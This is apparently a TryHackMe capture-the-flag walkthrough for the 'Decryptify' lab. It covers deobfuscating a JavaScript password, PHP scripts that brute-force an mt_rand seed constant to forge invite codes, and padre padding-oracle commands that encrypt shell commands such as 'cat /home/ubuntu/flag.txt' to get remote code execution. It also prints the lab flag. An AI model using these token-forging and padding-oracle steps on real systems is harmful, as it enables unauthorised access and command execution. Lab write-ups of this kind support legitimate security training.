# [Decryptify](https://tryhackme.com/room/decryptify)

## Use your exploitation skills to uncover encrypted keys and get RCE.

# Challenge

## _Can you decrypt the secrets and get RCE on the system?_

### What is the flag value after logging into the panel?

1. Start with a full port scan to identify all running services:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c5:ee:76:29:56:85:0c:06:1f:8a:58:ab:66:bc:29:76 (RSA)
|   256 e4:54:6a:80:31:1b:40:10:d9:5a:0a:2f:05:83:71:4c (ECDSA)
|_  256 55:1d:e4:55:ca:8e:13:6f:ac:a2:34:4d:59:a0:56:eb (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login - Decryptify
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Perform directory enumeration to discover hidden files and endpoints:

```bash
feroxbuster -u http://<TARGET_IP>:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results**

```
200      GET        1l       15w      723c http://<TARGET_IP>:1337/js/api.js
200      GET       28l       66w     1043c http://<TARGET_IP>:1337/api.php
200      GET        7l     1031w    78129c http://<TARGET_IP>:1337/js/bootstrap.bundle.min.js
200      GET        6l     2272w   220780c http://<TARGET_IP>:1337/css/bootstrap.min.css
200      GET       76l      184w     3220c http://<TARGET_IP>:1337/
200      GET        9l       88w      644c http://<TARGET_IP>:1337/logs/app.log
```

3. Navigate to `http://<TARGET_IP>:1337/js/api.js`. The file contains obfuscated JavaScript using an array-shuffling technique to hide a hardcoded string:

```js
function b(c, d) {
  const e = a();
  return (
    (b = function (f, g) {
      f = f - 0x165;
      let h = e[f];
      return h;
    }),
    b(c, d)
  );
}
const j = b;
function a() {
  const k = [
    "16OTYqOr",
    "861cPVRNJ",
    "474AnPRwy",
    "H7gY2tJ9wQzD4rS1",
    "5228dijopu",
    "29131EDUYqd",
    "8756315tjjUKB",
    "1232020YOKSiQ",
    "7042671GTNtXE",
    "1593688UqvBWv",
    "90209ggCpyY",
  ];
  a = function () {
    return k;
  };
  return a();
}
(function (d, e) {
  const i = b,
    f = d();
  while (!![]) {
    try {
      const g =
        parseInt(i(0x16b)) / 0x1 +
        -parseInt(i(0x16f)) / 0x2 +
        (parseInt(i(0x167)) / 0x3) * (parseInt(i(0x16a)) / 0x4) +
        parseInt(i(0x16c)) / 0x5 +
        (parseInt(i(0x168)) / 0x6) * (parseInt(i(0x165)) / 0x7) +
        (-parseInt(i(0x166)) / 0x8) * (parseInt(i(0x16e)) / 0x9) +
        parseInt(i(0x16d)) / 0xa;
      if (g === e) break;
      else f["push"](f["shift"]());
    } catch (h) {
      f["push"](f["shift"]());
    }
  }
})(a, 0xe43f0);
const c = j(0x169);
```

4. Open the browser developer tools (F12), paste the entire script into the Console tab, and evaluate the variable `c` to reveal the plaintext password:

<img width="1374" height="684" alt="SCREEN01" src="https://github.com/user-attachments/assets/fa2aa33a-8ddd-4291-b0eb-3d3b919a39bf" />

5. Navigate to `http://<TARGET_IP>:1337/api.php` and use `H7gY2tJ9wQzD4rS1` as the password. The page reveals the invite-code generation logic used by the application:

```
This function generates a invite_code against a user email.

// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}
     $seed_value = calculate_seed_value($email, $constant_value);
     mt_srand($seed_value);
     $random = mt_rand();
     $invite_code = base64_encode($random);
```

6. Navigate to `http://<TARGET_IP>:1337/logs/app.log`. The application log exposes a previously generated invite code along with the email it was created for:

**Results:**

```
2025-01-23 14:32:56 - User POST to /index.php (Login attempt)
2025-01-23 14:33:01 - User POST to /index.php (Login attempt)
2025-01-23 14:33:05 - User GET /index.php (Login page access)
2025-01-23 14:33:15 - User POST to /index.php (Login attempt)
2025-01-23 14:34:20 - User POST to /index.php (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:35:25 - User GET /index.php (Login page access)
2025-01-23 14:36:30 - User POST to /dashboard.php (User alpha@fake.thm deactivated)
2025-01-23 14:37:35 - User GET /login.php (Page not found)
2025-01-23 14:38:40 - User POST to /dashboard.php (New user created: hello@fake.thm)
```

7. Since we know a valid email–invite_code pair, we can brute-force the unknown `$constant_value` by iterating through all possible values and checking which one reproduces the known invite code. Save and run the following PHP script:

```php
<?php
function calculate_seed_value($email, $constant_value) {
  $email_length = strlen($email);
  $email_hex = hexdec(substr($email, 0, 8));
  $seed_value = hexdec($email_length + $constant_value + $email_hex);
  return $seed_value;
}

function reverse_constant_value($email, $invite_code) {
  $random_value = intval(base64_decode($invite_code));

  $email_length = strlen($email);
  $email_hex = hexdec(substr($email, 0, 8));

  for ($constant_value = 0; $constant_value <= 1000000; $constant_value++) {
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    mt_srand($seed_value);
    if (mt_rand() === $random_value) {
      return $constant_value;
    }
  }
  return "Constant value not found in range.";
}

$email = "alpha@fake.thm";
$invite_code = "MTM0ODMzNzEyMg==";

$constant_value = reverse_constant_value($email, $invite_code);

echo "Reversed Constant Value: " . $constant_value . PHP_EOL;
?>
```

**Result:**

```
Reversed Constant Value: 99999
```

8. Now that we know the global `$constant_value` is `99999`, we can generate a valid invite code for the active account `hello@fake.thm`. Save and run the following script:

```php
<?php

function calculate_seed_value($email, $constant_value) {
  $email_length = strlen($email);
  $email_hex = hexdec(substr($email, 0, 8));
  $seed_value = hexdec($email_length + $constant_value + $email_hex);

  return $seed_value;
}

function generate_token($email, $constant_value) {
  $seed_value = calculate_seed_value($email, $constant_value);
  mt_srand($seed_value);
  $random = mt_rand();
  $invite_code = base64_encode($random);

  return $invite_code;
}


$email = "hello@fake.thm";
$token = generate_token($email, 99999);
print $token
?>
```

9. Go to `http://<TARGET_IP>:1337/` and log in as `hello@fake.thm` using the generated invite code. The dashboard greets you with the first flag:

<img width="1117" height="506" alt="SCREEN02" src="https://github.com/user-attachments/assets/dcd988d0-1f9e-4800-af50-46c740a98382" />

---

### What is the content of the **/home/ubuntu/flag.txt** file?

1. While logged into the dashboard, view the page source with `view-source:http://<TARGET_IP>:1337/dashboard.php`. A hidden form field in the footer contains an encrypted `date` parameter:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dashboard</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet" />
  </head>
  <body>
    <header class="bg-primary text-white text-center py-3">
      <h1>Dashboard</h1>
    </header>
    <main class="container my-5">
      <h2>Welcome, hello@fake.thm! - Flag: THM{CryptographyPwn007}</h2>
      <a href="?action=logout" class="btn btn-danger">Logout</a>
      <table class="table mt-4">
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>hello@fake.thm</td>
            <td>user</td>
          </tr>
          <tr>
            <td>admin@fake.thm</td>
            <td>admin</td>
          </tr>
        </tbody>
      </table>
    </main>
    <footer class="bg-light text-center py-3">
      <p>&copy; <strong>2026 </strong> Decryptify</p>
      <form method="get">
        <input
          type="hidden"
          name="date"
          value="45Tk8j7N3SlFCad/Y16IrFGUhm212VYoGDESzT23XW8="
        />
      </form>
    </footer>
  </body>
</html>
```

> The server-side code appears to decrypt this value and use it to display the current year. This is a classic indicator of a **CBC Padding Oracle** vulnerability. The server decrypts a user-supplied ciphertext and leaks padding validity through its response.

2. Use [padre](https://github.com/glebarez/padre), a padding oracle exploitation tool, to decrypt the current `date` ciphertext and confirm what command the server is executing. Substitute your session cookies from the browser:

```bash
./padre-linux-amd64 -cookie 'PHPSESSID=oifethikdncvgdcinf8qm12bkl; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' -u 'http://<TARGET_IP>:1337/dashboard.php?date=$' '45Tk8j7N3SlFCad/Y16IrFGUhm212VYoGDESzT23XW8='
```

**Result:**

```
date +%Y\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08
```

> The decrypted plaintext is `date +%Y`. The server is passing this value directly to a shell, which explains why the footer shows the current year. The output of `date +%Y` is rendered on the page. This confirms **Remote Code Execution via padding oracle**.

3. Use padre's `-enc` flag to encrypt an arbitrary command. First confirm RCE with `whoami`:

```bash
./padre-linux-amd64 -cookie 'PHPSESSID=oifethikdncvgdcinf8qm12bkl; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' -u 'http://<TARGET_IP>:1337/dashboard.php?date=$' -enc 'whoami'
```

4. Visit `http://<TARGET_IP>:1337/dashboard.php?date=ZmruQj2D5ttlbmJyaWVhcw==`. The footer now renders the output of whoami, confirming the server is executing commands as the web application user.

5. Encrypt the final command to read the target file:

```bash
./padre-linux-amd64 -cookie 'PHPSESSID=oifethikdncvgdcinf8qm12bkl; role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d' -u 'http://<TARGET_IP>:1337/dashboard.php?date=$' -enc 'cat /home/ubuntu/flag.txt'
```

6. Visit `http://<TARGET_IP>:1337/dashboard.php?date=8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==`. The footer renders the contents of `/home/ubuntu/flag.txt`.

<img width="1080" height="510" alt="SCREEN03" src="https://github.com/user-attachments/assets/dc9b1838-1b60-4755-a011-29a8c0b36770" />

---
